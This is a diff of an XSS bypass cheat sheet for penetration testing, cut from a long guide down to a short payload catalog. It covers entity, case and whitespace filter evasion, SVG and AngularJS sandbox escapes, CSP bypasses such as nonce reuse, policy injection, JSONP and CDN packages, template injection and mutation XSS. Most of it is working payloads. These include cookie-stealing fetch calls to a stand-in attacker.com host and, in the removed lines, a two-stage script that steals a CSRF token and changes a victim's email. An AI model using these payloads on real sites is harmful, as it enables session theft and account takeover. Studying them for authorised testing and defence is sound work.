@@ -1,1001 +1,199 @@
-# XSS Bypass Techniques - Complete Reference
+# XSS Bypass Techniques
 
-## Overview
+WAF / filter evasion catalog. Pair with `dom-xss-advanced.md` and `scenarios/dom-vulnerabilities/waf-filter-bypass.md`.
 
-This comprehensive guide covers Web Application Firewall (WAF) bypass techniques, filter evasion methods, and advanced XSS exploitation strategies for real-world security testing.
+## HTML entity bypass (attribute decoders)
 
----
-
-## Table of Contents
-
-1. [HTML Encoding Bypass](#html-encoding-bypass)
-2. [Character Set Manipulation](#character-set-manipulation)
-3. [WAF Bypass Strategies](#waf-bypass-strategies)
-4. [SVG-Based Bypasses](#svg-based-bypasses)
-5. [AngularJS Sandbox Escapes](#angularjs-sandbox-escapes)
-6. [CSP Bypass Techniques](#csp-bypass-techniques)
-7. [Template Injection](#template-injection)
-8. [Alternative Event Handlers](#alternative-event-handlers)
-9. [Custom Tags Exploitation](#custom-tags-exploitation)
-10. [Advanced Encoding Techniques](#advanced-encoding-techniques)
-
----
-
-## HTML Encoding Bypass
-
-### Context: HTML Attributes with Decoders
-
-**Vulnerability**: When input is reflected in an HTML attribute that's decoded before JavaScript execution.
-
-**Technique**: Use HTML entities that browsers decode before JavaScript parsing.
-
-### Example
-
-**Vulnerable Pattern**:
+When input is reflected in an HTML attribute that's decoded before JS execution:
 ```html
 <a onclick="var x='USER_INPUT'">Click</a>
 ```
+Payload `&apos;-alert(1)-&apos;` → `<a onclick="var x=''-alert(1)-''">` → executes.
 
-**Attack**:
-```
-Input: &apos;-alert(1)-&apos;
-Reflected: <a onclick="var x='&apos;-alert(1)-&apos;'">
-Decoded by browser: <a onclick="var x=''-alert(1)-''">
-```
-
-**Why It Works**:
-1. HTML entity decoding happens BEFORE JavaScript parsing
-2. `&apos;` becomes `'` at HTML level
-3. JavaScript parser sees closed string
-4. alert(1) executes as code
-
-### Common HTML Entities for Bypass
-
-```
-&apos;  → '  (single quote)
-&quot;  → "  (double quote)
-&lt;    → <  (less than)
-&gt;    → >  (greater than)
-&#x27;  → '  (single quote hex)
-&#x22;  → "  (double quote hex)
-&#39;   → '  (single quote decimal)
-&#34;   → "  (double quote decimal)
-```
-
-### Payload Examples
-
-**Breaking out of single-quoted attribute**:
-```javascript
-&apos;-alert(1)-&apos;
-&#x27;-alert(1)-&#x27;
-&#39;-alert(1)-&#39;
-```
-
-**Breaking out of double-quoted attribute**:
-```javascript
-&quot;-alert(1)-&quot;
-&#x22;-alert(1)-&#x22;
-&#34;-alert(1)-&#34;
-```
-
-### Full Context Example
-
-**Example**: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded
-
-**Vulnerable Code**:
-```html
-<a onclick="this.setAttribute('href','http://USER_INPUT')">
-```
-
-**Working Payload**:
-```
-http://attacker.com&apos;);alert(1);//
-```
-
-**Rendered HTML**:
-```html
-<a onclick="this.setAttribute('href','http://attacker.com&apos;);alert(1);//')">
-```
-
-**After HTML Entity Decoding**:
-```html
-<a onclick="this.setAttribute('href','http://attacker.com');alert(1);//')">
-```
-
----
-
-## Character Set Manipulation
-
-### Case Variation
-
-**Context**: Case-sensitive filters
-
-**Technique**: Mix uppercase and lowercase to bypass string matching
+Common entities: `&apos;` `&quot;` `&lt;` `&gt;` `&#x27;` `&#x22;` `&#39;` `&#34;`.
 
-**Examples**:
-```html
-<ScRiPt>alert(1)</ScRiPt>
-<IMG SRC=x ONERROR=alert(1)>
-<SvG OnLoAd=alert(1)>
-<BoDy OnLoAd=alert(1)>
-<IFrAmE src="javascript:alert(1)">
-```
-
-**Why It Works**:
-- HTML tags and attributes are case-insensitive
-- Simple blacklist filters often match specific case
-- Browser normalizes tag names before processing
-
-### Space Bypass
-
-**Context**: Filters that block space characters
-
-**Techniques**:
-
-**1. Forward Slash**:
-```html
-<img/src=x/onerror=alert(1)>
-<svg/onload=alert(1)>
-```
+Single-quote attr: `&apos;-alert(1)-&apos;` / `&#x27;...&#x27;` / `&#39;...&#39;`.
+Double-quote attr: `&quot;-alert(1)-&quot;` / `&#x22;...&#x22;` / `&#34;...&#34;`.
 
-**2. Tab Character** (URL-encoded: %09):
-```html
-<img%09src=x%09onerror=alert(1)>
-<img    src=x   onerror=alert(1)>  <!-- literal tabs -->
-```
+setAttribute pattern: `http://attacker.com&apos;);alert(1);//` → after decode → `'); alert(1); //`.
 
-**3. Newline** (URL-encoded: %0A or %0D):
-```html
-<img%0Asrc=x%0Aonerror=alert(1)>
-<img%0Dsrc=x%0Donerror=alert(1)>
-```
+## Character set tricks
 
-**4. Comment (in JavaScript)**:
-```html
-<img/**/src=x/**/onerror=alert(1)>
-```
+**Case**: `<ScRiPt>alert(1)</ScRiPt>`, `<SvG OnLoAd=alert(1)>`, `<IFrAmE src="javascript:alert(1)">`.
 
-**5. NULL byte** (works in some contexts):
-```html
-<img%00src=x%00onerror=alert(1)>
-```
-
-### Quote Bypass
-
-**Context**: Filters blocking quote characters
-
-**Techniques**:
-
-**1. No Quotes Needed**:
-```html
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-```
-
-**2. Backticks (template literals)**:
-```html
-<img src=`x` onerror=`alert(1)`>
-```
-
-**3. Mix Quote Types**:
-```html
-<img src='x' onerror="alert(1)">
-<img src="x" onerror='alert(1)'>
-```
-
-### Parentheses Bypass
-
-**Context**: Filters blocking parentheses
-
-**Techniques**:
-
-**1. onerror with throw**:
-```javascript
-onerror=alert;throw 1
-```
-
-**2. Template literal tag function**:
-```html
-<svg onload=alert`1`>
-```
-
-**3. Exception-based execution**:
-```javascript
-onerror=alert;throw 1337
-```
-
-### Semicolon Bypass
-
-**Context**: Filters blocking semicolons
-
-**Techniques**:
-
-**1. Arithmetic operators**:
-```javascript
-'-alert(1)-'
-'+alert(1)+'
-'*alert(1)*'
-```
-
-**2. Comma operator**:
-```javascript
-',alert(1)//'
-```
-
-**3. Newline**:
-```javascript
-'
-alert(1)//
-```
-
----
-
-## WAF Bypass Strategies
-
-### Systematic Enumeration with Burp Intruder
-
-**Example**: Reflected XSS with some SVG markup allowed
-
-**Methodology**:
-
-**Phase 1: Enumerate Allowed Tags**
-
-1. **Setup Intruder**:
-   - Position: `/?search=<§§>`
-   - Attack type: Sniper
-   - Payload type: Simple list
-
-2. **Load Tag Payloads**:
-   ```
-   script
-   img
-   svg
-   body
-   iframe
-   object
-   embed
-   animate
-   animatetransform
-   video
-   audio
-   [... full list from XSS cheat sheet]
-   ```
-
-3. **Run Attack and Filter**:
-   - Sort by Status Code
-   - Status 200 = Allowed
-   - Status 400/403 = Blocked
-
-4. **Identify Allowed Tags**:
-   ```
-   ✓ svg
-   ✓ animatetransform
-   ✓ title
-   ✓ image
-   ```
-
-**Phase 2: Enumerate Allowed Attributes**
-
-1. **Setup for Attributes**:
-   - Position: `/?search=<svg><animatetransform §§=1>`
-   - Load event handler payloads
-
-2. **Event Handler Payloads**:
-   ```
-   onload
-   onerror
-   onclick
-   onmouseover
-   onbegin
-   onend
-   onrepeat
-   [... full event handler list]
-   ```
-
-3. **Identify Allowed Events**:
-   ```
-   ✓ onbegin
-   ```
-
-**Phase 3: Construct Exploit**:
-```html
-<svg><animatetransform onbegin=alert(1)>
-```
-
-### WAF Evasion Techniques
-
-**1. Tag Fragmentation**:
-```html
-<!-- HTML comments -->
-<scr<!---->ipt>alert(1)</scr<!---->ipt>
-
-<!-- Newlines -->
-<scri
-pt>alert(1)</script>
-```
-
-**2. Character Insertion**:
-```html
-<!-- NULL byte (limited browser support) -->
-<scri\x00pt>alert(1)</script>
-```
-
-**3. Alternate Syntax**:
-```html
-<!-- Self-closing tags -->
-<script src=//attacker.com/x.js />
-
-<!-- No closing tag -->
-<img src=x onerror=alert(1)>
-```
-
-**4. Polyglot Payloads** (work in multiple contexts):
-```javascript
-javascript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
-```
-
----
-
-## SVG-Based Bypasses
-
-### SVG Tags and Events
-
-SVG elements provide numerous bypass opportunities when standard HTML tags are blocked.
-
-### Allowed SVG Tags
-
-```html
-<svg>
-<animate>
-<animatetransform>
-<animatemotion>
-<set>
-<image>
-<foreignobject>
-<title>
-<desc>
-<use>
-```
-
-### SVG Event Handlers
-
-```html
-onbegin
-onend
-onrepeat
-onload (on svg root)
-```
-
-### SVG Exploitation Techniques
-
-**1. Basic SVG XSS**:
+**Space bypass**: `<img/src=x/onerror=alert(1)>`, `<svg/onload=alert(1)>`, `<img%09src=x%09onerror=alert(1)>`, `<img%0Asrc=x%0Aonerror=alert(1)>`, `<img/**/src=x/**/onerror=alert(1)>`, `<img%00src=x%00onerror=alert(1)>` (limited).
+
+**Quote bypass**: `<img src=x onerror=alert(1)>` (no quotes), `<img src=`x` onerror=`alert(1)`>` (backticks), mix `<img src='x' onerror="alert(1)">`.
+
+**Parentheses bypass**: `onerror=alert;throw 1`, `<svg onload=alert\`1\`>`, `onerror=alert;throw 1337`.
+
+**Semicolon bypass**: `'-alert(1)-'`, `'+alert(1)+'`, `',alert(1)//'`, newline + `alert(1)//`.
+
+## WAF enumeration with Burp Intruder
+
+Phase 1 — allowed tags: position `<§§>`, payload list (script, img, svg, body, iframe, object, embed, animate, animatetransform, video, audio, ...). Status 200 = allowed.
+
+Phase 2 — allowed attrs / events: position `<svg><animatetransform §§=1>`, payload list (onload, onerror, onclick, onbegin, onend, onrepeat, onfocus, ontoggle, ...). Status 200 = allowed.
+
+Phase 3 — combine: e.g. `<svg><animatetransform onbegin=alert(1)>`.
+
+**Tag fragmentation**: `<scr<!---->ipt>alert(1)</scr<!---->ipt>`, multi-line `<scri\npt>...`.
+
+**Polyglot** (works in many contexts): `javascript:/*-/*\`/*\\\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e`.
+
+## SVG-based bypasses
+
+Allowed tags often: `<svg> <animate> <animatetransform> <animatemotion> <set> <image> <foreignobject> <title> <desc> <use>`. SVG events: `onbegin onend onrepeat onload`.
+
 ```html
 <svg onload=alert(1)>
-```
-
-**2. Nested SVG Elements**:
-```html
 <svg><animate onbegin=alert(1)>
 <svg><animatetransform onbegin=alert(1)>
-```
-
-**3. SVG with Anchor**:
-```html
 <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>
-```
-
-**4. SVG foreignObject**:
-```html
 <svg><foreignobject><body onload=alert(1)></foreignobject></svg>
 ```
 
-### Example
+`<animate>` sets attributes dynamically — bypasses static-pattern href filters. Click required to fire.
 
-**Challenge**: Event handlers and href attributes blocked
+## AngularJS sandbox escapes
 
-**Challenge**: Standard event handlers and href blocked
+Basic: `{{1+1}}` test, `{{constructor.constructor('alert(1)')()}}`, `{{$on.constructor('alert(1)')()}}`.
 
-**Solution**: Use SVG animate to dynamically set href
-```html
-<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>
-```
-
-**Why It Works**:
-- `animate` element modifies attributes dynamically
-- Filter checks static `href=` patterns
-- Dynamic attribute setting bypasses filter
-- Requires click on text to trigger
-
----
-
-## AngularJS Sandbox Escapes
-
-### Understanding AngularJS Sandbox
-
-**Context**: AngularJS versions < 1.6 had sandboxing to restrict expression capabilities
-
-**Purpose**: Prevent malicious code execution in templates
-
-**Limitation**: Sandbox can be bypassed
-
-### Basic AngularJS Expression
-
-**Vulnerable Pattern**:
-```html
-<body ng-app>
-<div>{{USER_INPUT}}</div>
-</body>
-```
-
-**Basic Payloads**:
+**charAt corruption (no strings)**:
 ```javascript
-{{1+1}}  // Test if AngularJS active (displays 2)
-{{constructor.constructor('alert(1)')()}}
-{{$on.constructor('alert(1)')()}}
+toString().constructor.prototype.charAt=[].join
+[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
 ```
+Builds `x=alert(1)` from char codes after corrupting `charAt`.
 
-### Sandbox Escape Techniques
-
-**1. Constructor Chain**:
-```javascript
-{{constructor.constructor('alert(1)')()}}
-```
-
-**Breakdown**:
-- `constructor` → Object's constructor function
-- `.constructor` → Function constructor
-- `('alert(1)')` → Code as string
-- `()` → Execute
-
-**2. Using $on**:
-```javascript
-{{$on.constructor('alert(1)')()}}
-```
-
-**3. Using toString**:
-```javascript
-{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
-```
-
-### Advanced: Sandbox Escape Without Strings
-
-**Example**: Reflected XSS with AngularJS sandbox escape without strings
-
-**Challenge**: Cannot use string literals (quotes blocked)
-
-**Solution**:
-```javascript
-1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
-```
-
-**Breakdown**:
-
-1. **Corrupt charAt**:
-   ```javascript
-   toString().constructor.prototype.charAt=[].join
-   ```
-   - Overwrites charAt on String prototype
-   - Breaks sandbox's string validation
-
-2. **Build string from character codes**:
-   ```javascript
-   toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
-   ```
-   - Character codes: `120=x, 61==, 97=a, 108=l, 101=e, 114=r, 116=t, 40=(, 49=1, 41=)`
-   - Result: `x=alert(1)`
-
-3. **Execute via orderBy**:
-   ```javascript
-   [1]|orderBy:[constructed_string]
-   ```
-   - orderBy filter processes expression
-   - Evaluates constructed string
-   - Executes `alert(1)`
-
-### ng-include Same-Origin XHR Exploit
-
-When AngularJS is present (any version) and the attacker controls HTML in a template context, `ng-include` can fetch ANY same-origin URL and render it into the DOM as an AngularJS template. This is a primitive for reading/triggering same-origin URLs with the victim's session.
-
-**Payload**:
+**ng-include same-origin XHR**: when attacker controls HTML in a template context:
 ```html
 <div ng-app ng-include="'/admin/some-endpoint'"></div>
-<!-- or to chain into a CSRF-able action triggering a server-side OAuth callback: -->
 <div ng-app ng-include src="'/accounts/oauth2/provider/callback/?code=ATTACKER_CODE'"></div>
 ```
+Loads URL with victim cookies, response parsed as Angular template (chains into sandbox escape). Works under strict CSP if Angular itself is allowed. Useful when stored HTML injection strips `<script>` but allows directives.
 
-Key properties:
-- Loads the URL with the victim's cookies (same-origin XHR).
-- Response is parsed as an Angular template — any embedded Angular expressions also execute, chaining into sandbox escape.
-- Works under strict CSP that forbids inline scripts as long as `ng-include` / Angular directives are allowed (which they are, since Angular itself is allowed).
-- Useful when attacker has stored HTML injection but not full JS (e.g. user bio / comment that strips `<script>` but not Angular directives).
-
-Typical chain: stored HTML injection with Angular directives -> admin views page -> `ng-include` fetches admin-only endpoint (or triggers OAuth re-linking callback, CSRF-protected state-changing GET, etc.) with admin session cookies.
-
-### AngularJS CSP Bypass
-
-**Example**: Reflected XSS with AngularJS sandbox escape and CSP
-
-**Challenge**: CSP blocks inline scripts, AngularJS sandbox active
-
-**Solution**:
+**AngularJS CSP bypass**:
 ```html
 <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)' autofocus>#x
 ```
+ng-focus directive isn't blocked by CSP; expression assignment `(z=alert)` bypasses filter; URL `#x` auto-focuses.
 
-**Breakdown**:
+## CSP bypass techniques
 
-1. **ng-focus directive**: Triggers on focus
-2. **$event.composedPath()**: Returns event path array (includes window)
-3. **orderBy filter**: Processes the array
-4. **(z=alert)(document.cookie)**: Assigns alert to z, then calls it
-5. **autofocus**: Auto-focuses element
-6. **#x**: URL hash focuses element with id=x
-
-**Why It Works**:
-- CSP allows event handlers (not inline `<script>`)
-- ng-focus is an AngularJS directive, not blocked by CSP
-- Expression evaluation within directive bypasses sandbox
-- Variable assignment `(z=alert)` bypasses filter
-
----
-
-## CSP Bypass Techniques
-
-### CSP Nonce Reuse / Stale Nonce
-
-**Context**: CSP uses `script-src 'nonce-xxx'` but the nonce value is static, cached, or predictable.
-
-**Detection**:
-1. Make 3+ requests to the same page — compare the nonce value each time
-2. If nonce is identical across requests, it's **static** (trivially bypassable)
-3. Check if nonce appears in cached responses (CDN, reverse proxy)
-4. Check if nonce is derived from predictable values (timestamp, session ID)
-
-**Exploit** (static nonce):
-```html
-<!-- Read nonce from page source, inject script with same nonce -->
-<script nonce="STATIC_NONCE_VALUE">alert(document.cookie)</script>
-```
-
-**Exploit** (nonce in cached response):
-```html
-<!-- Fetch the page to extract nonce, then inject with that nonce -->
-<script>
+### Stale / static / cached nonce
+Compare nonce across 3+ requests. If identical or cached:
+```javascript
 fetch('/page').then(r=>r.text()).then(t=>{
   const nonce = t.match(/nonce="([^"]+)"/)[1];
   const s = document.createElement('script');
-  s.nonce = nonce;
-  s.textContent = 'alert(document.cookie)';
+  s.nonce = nonce; s.textContent = 'alert(document.cookie)';
   document.body.appendChild(s);
 });
-</script>
 ```
 
-**Why It Works**: CSP nonces are designed to be unique per-response. When reused, any XSS injection point can simply include the known nonce value.
+### CSP policy injection
+`Content-Security-Policy: ... ; report-uri /csp-report?token=USER`. Inject `;script-src-elem 'unsafe-inline'`. More-specific directive wins. Full URL: `?token=;script-src-elem%20'unsafe-inline'`.
 
-### CSP Policy Injection
+### Dangling markup (form-action missing)
+Strict CSP without `form-action`: inject `<button formaction="https://exploit-server.com" formmethod="get">`. Two-stage: stage 1 redirects victim through CSRF endpoint with form action to exploit server (token leaks via GET URL); stage 2 reuses the captured token to perform state-changing POST.
 
-**Example**: Reflected XSS protected by CSP, with CSP bypass
+### JSONP callback reflection (cross-origin allow-list OR same-origin iframe)
+Cross-origin: CSP `script-src 'self' https://trusted-site.com` → `<script src="https://trusted-site.com/jsonp?callback=alert"></script>`. Same-origin variant (CSP `default-src 'self'` + a `/list`-style loader that injects `<script src="/api/jsonp?callback=<URL_PARAM>">` from `location.search`): inject `<iframe src="/list?callback=...">` with bare statements (NOT IIFE) — see [scenarios/xss/jsonp-callback-iframe-exfil.md](scenarios/xss/jsonp-callback-iframe-exfil.md).
 
-**Vulnerable CSP**:
-```http
-Content-Security-Policy: default-src 'self'; script-src 'self'; report-uri /csp-report?token=USER_CONTROLLED
-```
-
-**Exploit**: Inject additional directive via token parameter
-```
-token=;script-src-elem 'unsafe-inline'
-```
-
-**Result**:
-```http
-Content-Security-Policy: default-src 'self'; script-src 'self'; report-uri /csp-report?token=;script-src-elem 'unsafe-inline'
-```
-
-**Why It Works**:
-- Semicolon terminates report-uri directive
-- `script-src-elem` is more specific than `script-src`
-- More specific directives take precedence
-- `'unsafe-inline'` allows inline scripts
-
-**Full Exploit URL**:
-```
-https://target.com/?search=<script>alert(1)</script>&token=;script-src-elem%20'unsafe-inline'
-```
-
-### Dangling Markup for CSP Bypass
-
-**Example**: Reflected XSS protected by very strict CSP, with dangling markup attack
-
-**Strict CSP**:
-```http
-Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
-```
-
-**Problem**: CSP blocks all inline scripts
-
-**Missing Directive**: No `form-action` directive
-
-**Exploit**: Form hijacking to exfiltrate CSRF token
-
-**Phase 1: Button Injection**
+### CDN allowlist + npm packages
+CSP `script-src 'self' https://cdn.jsdelivr.net`. Use `csp-bypass` npm package:
 ```html
-<button formaction="https://exploit-server.com" formmethod="get">Click me</button>
-```
-
-**Phase 2: Extract CSRF Token**
-```html
-email=foo"><button formaction="https://exploit-server.com/exploit" formmethod="get">Click me</button>
-```
-
-**Phase 3: Two-Stage Exploit**
-
-```javascript
-const academyFrontend = "https://target.com/";
-const exploitServer = "https://exploit-server.com/exploit";
-const url = new URL(location);
-const csrf = url.searchParams.get('csrf');
-
-if (csrf) {
-    // Stage 2: Have token, change email
-    const form = document.createElement('form');
-    form.method = 'post';
-    form.action = `${academyFrontend}my-account/change-email`;
-
-    const emailInput = document.createElement('input');
-    emailInput.name = 'email';
-    emailInput.value = 'hacker@evil.com';
-
-    const tokenInput = document.createElement('input');
-    tokenInput.name = 'csrf';
-    tokenInput.value = csrf;
-
-    form.append(emailInput, tokenInput);
-    document.documentElement.append(form);
-    form.submit();
-} else {
-    // Stage 1: No token yet, inject button to steal it
-    location = `${academyFrontend}my-account?email=foo"><button formaction="${exploitServer}" formmethod="get">Click me</button>`;
-}
-```
-
-**Why It Works**:
-- CSP blocks JavaScript
-- But doesn't restrict form submissions (no `form-action`)
-- Form GET request exposes CSRF token in URL
-- Exploit server receives token via query parameter
-- Second stage uses token to change email
-
-### JSONP Endpoints for CSP Bypass
-
-**Concept**: If CSP whitelists certain domains, find JSONP endpoints on those domains
-
-**Example CSP**:
-```http
-Content-Security-Policy: script-src 'self' https://trusted-site.com
-```
-
-**If trusted-site.com has JSONP**:
-```html
-<script src="https://trusted-site.com/jsonp?callback=alert"></script>
-```
-
-### CDN Allowlist Bypass via npm Packages
-
-**Concept**: When CSP whitelists an entire CDN origin (e.g., `cdn.jsdelivr.net`, `cdnjs.cloudflare.com`, `unpkg.com`), any npm package hosted there can be loaded — including packages designed to bypass CSP.
-
-**Example CSP**:
-```http
-Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net
-```
-
-**Key Package**: `csp-bypass` on npm provides multiple bypass variants:
-- `classic.js` — Uses `eval()` (fails if CSP lacks `'unsafe-eval'`)
-- **`sval-classic.js`** — Bundles a full JS interpreter (sval), bypasses `eval()` restriction
-- Both scan DOM for elements with `csp` or `csp-base64` attributes and execute the content
-
-**Payload (with eval restriction)**:
-```html
+<!-- with eval -->
+<script src="https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/classic.js"></script>
+<br csp="fetch('https://attacker.com?c='+document.cookie)">
+<!-- without eval (sval JS interpreter) -->
 <script src="https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.js"></script>
 <br csp-base64="BASE64_ENCODED_JS_PAYLOAD">
 ```
+Checklist: verify `connect-src` open for fetch; use `sval-classic` if no `unsafe-eval`; base64 the payload; fall back to `document.location` redirect if `connect-src` blocks fetch.
 
-**Payload (without eval restriction)**:
-```html
-<script src="https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/classic.js"></script>
-<br csp="fetch('https://attacker.com?c='+document.cookie)">
-```
+### Base-tag hijack
+CSP allows nonce/hash but not `base-uri`: `<base href="https://attacker.com/">` redirects relative script loads.
 
-**Why It Works**:
-- CDN allowlist permits loading ANY package from the CDN
-- `sval-classic.js` interprets JS without `eval()`, so `'unsafe-eval'` is not needed
-- Attacker embeds JS in a DOM attribute, sval reads and executes it
-- Works for stored XSS where bot/victim visits page with injected content
+## Template injection
 
-**Checklist when encountering CDN in CSP**:
-1. Check if `connect-src` is set — if absent (and no `default-src`), outbound fetch is unrestricted
-2. Use `sval-classic.js` variant (not `classic.js`) when `'unsafe-eval'` is missing
-3. Base64-encode the payload in `csp-base64` attribute for cleaner injection
-4. Exfiltrate via `fetch()` to webhook/collaborator if `connect-src` is open
-5. Use `document.location` redirect as fallback if `connect-src` blocks fetch
+**JS template literals**: `Hello ${USER_INPUT}` → payload `${alert(1)}`, `${fetch('//attacker.com?c='+document.cookie)}`.
 
-### Base Tag Hijacking
+**SSTI (different class but related)** — Jinja2: `{{7*7}}`, `{{config.items()}}`. Twig: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`.
 
-**Concept**: If CSP doesn't restrict `base-uri`, inject base tag
+## Alternative event handlers
 
-**Payload**:
-```html
-<base href="https://attacker.com/">
-```
+**Common**: onclick, ondblclick, onmousedown/up/over/move/out/enter/leave.
+**Bypass-friendly**: onfocus/onblur/onfocusin/onfocusout, onsubmit/onreset/oninput/onchange/oninvalid/onsearch, onkeypress/down/up, onloadstart/onprogress/oncanplay/onplay/onpause, onanimationstart/end/iteration, ontransitionend/run/start, onwheel/onscroll, ontouchstart/end/move, onbegin/onend/onrepeat (SVG), onresize/onhashchange/onpageshow/onpagehide.
 
-**Result**: All relative script/style URLs load from attacker's domain
+**Auto-fire (no interaction)**: `<body onload>`, `<svg onload>`, `<img src=x onerror>`, `<video src=x onerror>`, `<audio src=x onerror>`, `<input autofocus onfocus>`, `<marquee onstart>`, `<iframe onload>`.
 
----
+## Custom tag exploitation
 
-## Template Injection
-
-### JavaScript Template Literals
-
-**Context**: Input reflected in ES6 template literal
-
-**Vulnerable Pattern**:
-```javascript
-var msg = `Hello ${USER_INPUT}`;
-```
-
-**Exploitation**:
-```javascript
-${alert(1)}
-${alert(document.domain)}
-${fetch('//attacker.com?c='+document.cookie)}
-```
-
-**Example**: Reflected XSS into a template literal
-
-**Solution**:
-```
-/?search=${alert(1)}
-```
-
-**Why It Works**:
-- Template literals evaluate `${}` as JavaScript expressions
-- No escaping applied to expression syntax
-- Runs in same scope as template literal
-
-### Server-Side Template Injection
-
-**Different from XSS**, but related:
-
-**Jinja2 (Python)**:
-```python
-{{7*7}}  # Test injection
-{{config.items()}}  # Expose config
-```
-
-**Twig (PHP)**:
-```php
-{{7*7}}
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
-```
-
----
-
-## Alternative Event Handlers
-
-### Common Event Handlers
-```html
-onclick, ondblclick, onmousedown, onmouseup, onmouseover,
-onmousemove, onmouseout, onmouseenter, onmouseleave
-```
-
-### Less Common (Often Bypass Filters)
-```html
-<!-- Focus events -->
-onfocus, onblur, onfocusin, onfocusout
-
-<!-- Form events -->
-onsubmit, onreset, oninput, onchange, oninvalid, onsearch
-
-<!-- Keyboard events -->
-onkeypress, onkeydown, onkeyup
-
-<!-- Media events -->
-onloadstart, onprogress, oncanplay, onplay, onpause
-
-<!-- Animation events -->
-onanimationstart, onanimationend, onanimationiteration
-
-<!-- Transition events -->
-ontransitionend, ontransitionrun, ontransitionstart
-
-<!-- Wheel/Scroll -->
-onwheel, onscroll
-
-<!-- Touch (mobile) -->
-ontouchstart, ontouchend, ontouchmove
-
-<!-- SVG-specific -->
-onbegin, onend, onrepeat
-
-<!-- Other -->
-onresize, onhashchange, onpageshow, onpagehide
-```
-
-### Automatic Trigger Events
-
-**No user interaction needed**:
-```html
-<body onload=alert(1)>
-<svg onload=alert(1)>
-<img src=x onerror=alert(1)>
-<video src=x onerror=alert(1)>
-<audio src=x onerror=alert(1)>
-<input autofocus onfocus=alert(1)>
-<marquee onstart=alert(1)>
-<iframe onload=alert(1)>
-```
-
----
-
-## Custom Tags Exploitation
-
-**Example**: Reflected XSS with all standard tags blocked except custom ones
-
-**Concept**: Application blocks standard HTML tags but allows custom tags
-
-**Exploit**:
 ```html
 <xss id=x onfocus=alert(document.cookie) tabindex=1>#x
 ```
+Custom tags aren't in standard blacklists; `tabindex` makes element focusable; `#x` auto-focuses.
 
-**Breakdown**:
-- `<xss>` → Custom tag (not in blacklist)
-- `id=x` → Element identifier
-- `onfocus=alert(document.cookie)` → Event handler
-- `tabindex=1` → Makes element focusable
-- `#x` → URL hash auto-focuses element
+## Advanced encoding
 
-**Delivery via Exploit Server**:
+**Double encoding**: `<script>` → `%3Cscript%3E` → `%253Cscript%253E` (when app decodes twice).
+
+**Unicode**: `<script>alert(1)</script>`, `<script&#x3E;alert(1)</script>`, overlong UTF-8 `%C0%BC` → `<` (rare).
+
+**Mutation XSS (mXSS)**: browser re-parses sanitized HTML differently than sanitizer expected:
 ```html
-<script>
-location = 'https://target.com/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
-</script>
-```
-
-**Why It Works**:
-- Blacklist only contains standard HTML tags
-- Custom tags are valid HTML5 elements
-- Can have event handlers
-- `tabindex` makes any element focusable
-- Hash-based auto-focus triggers event
-
----
-
-## Advanced Encoding Techniques
-
-### Double Encoding
-
-**Concept**: Application decodes input twice
-
-**Example**:
-```
-Original:  <script>
-URL:       %3Cscript%3E
-Double:    %253Cscript%253E
-
-After first decode: %3Cscript%3E
-After second decode: <script>
-```
-
-### Unicode Encoding
-
-```html
-<!-- Unicode escape -->
-<script\u003Ealert(1)</script>
-
-<!-- HTML entity -->
-<script&#x3E;alert(1)</script>
-
-<!-- Overlong UTF-8 (usually blocked) -->
-%C0%BC  → < (overlong encoding)
-```
-
-### Mutation XSS (mXSS)
-
-**Concept**: Browser mutates sanitized HTML
-
-**Example**:
-```html
-<!-- Input -->
 <noscript><p title="</noscript><img src=x onerror=alert(1)>">
-
-<!-- After sanitizer -->
-<noscript><p title="</noscript><img src=x onerror=alert(1)>">
-
-<!-- After browser mutation -->
-<p title="</noscript><img src=x onerror=alert(1)>">
 ```
 
----
+## HTML sanitizer entity-bypass via downstream decoding
 
-## HTML Sanitizer Entity Bypass via Downstream Decoding
-
-When an app uses a sanitizer (e.g., `sanitize-html`) that preserves HTML entities, but a downstream component (e.g., `node-html-markdown`, a Markdown converter, or a headless browser) decodes those entities before processing:
-
+Sanitizer preserves entities, downstream component decodes:
 ```
-Input:  <img src=x onerror=alert(1)>
-Sanitizer output: &lt;img src=x onerror=alert(1)&gt;  (safe — entities preserved)
-Downstream decode: <img src=x onerror=alert(1)>        (unsafe — entities decoded!)
+Input:           <img src=x onerror=alert(1)>
+Sanitizer:       &lt;img src=x onerror=alert(1)&gt;   (safe)
+Downstream:      <img src=x onerror=alert(1)>          (unsafe — re-rendered)
 ```
+Common chains: `sanitize-html` + `node-html-markdown`; DOMPurify + SSR re-parse; any sanitizer + PhantomJS/headless Chrome.
 
-### Exploitation Chain
-1. Sanitizer converts `<` to `&lt;` and considers it safe
-2. Downstream component (Markdown parser, template engine, headless browser) decodes `&lt;` back to `<`
-3. Result is rendered as active HTML/JavaScript
-
-### Common Vulnerable Chains
-- `sanitize-html` + `node-html-markdown` (converts HTML to Markdown, decodes entities first)
-- `DOMPurify` + server-side rendering that re-parses output
-- Any sanitizer + PhantomJS/headless Chrome that loads sanitized content as HTML
-
-### PhantomJS file:// Read via XSS
